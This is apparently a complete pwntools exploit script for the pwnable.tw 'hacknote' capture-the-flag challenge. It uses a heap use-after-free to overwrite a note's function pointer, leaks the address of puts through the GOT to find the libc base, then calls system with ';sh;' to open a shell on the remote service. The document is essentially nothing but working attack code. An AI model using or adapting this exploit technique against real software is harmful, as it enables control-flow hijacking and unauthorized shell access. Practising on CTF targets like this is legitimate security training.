from pwn import *

printaddr = 0x804862b
bin = ELF('./hacknote')

libc = ELF('./libc_32.so.6')
s = remote('chall.pwnable.tw', 10102)
	

def AddNote(size, string):
	s.recvuntil('Your choice :')
	s.sendline(b'1')
	s.recvuntil('Note size :')
	s.sendline(bytes(str(size), 'utf-8'))
	s.recvuntil('Content :')
	s.sendline(string)


def DeleteNote(index):
	s.recvuntil('Your choice :')
	s.sendline(b'2')
	s.recvuntil('Index :')
	s.sendline(bytes(str(index), 'utf-8'))


def PrintNote(index):
	s.recvuntil('Your choice :')
	s.sendline(b'3')
	s.recvuntil('Index :')
	s.sendline(bytes(str(index), 'utf-8'))


raw_input('DEBUG')

AddNote(16, b'cobra')
AddNote(16, b'cobra')
DeleteNote(0)
DeleteNote(1)
AddNote(8, p32(printaddr) + p32(bin.got['puts']))
PrintNote(0)
print('puts_got: ' + hex(bin.got['puts']))
putsaddr = u32(s.recv(4))
print('puts_addr: ' + hex(putsaddr))
libc.address = putsaddr - libc.sym['puts']
print('libc_base: ' + hex(libc.address))
print('system: ' + hex(libc.sym['system']))
DeleteNote(2)
AddNote(8, p32(libc.sym['system']) + b';sh;')
PrintNote(0)

s.interactive()

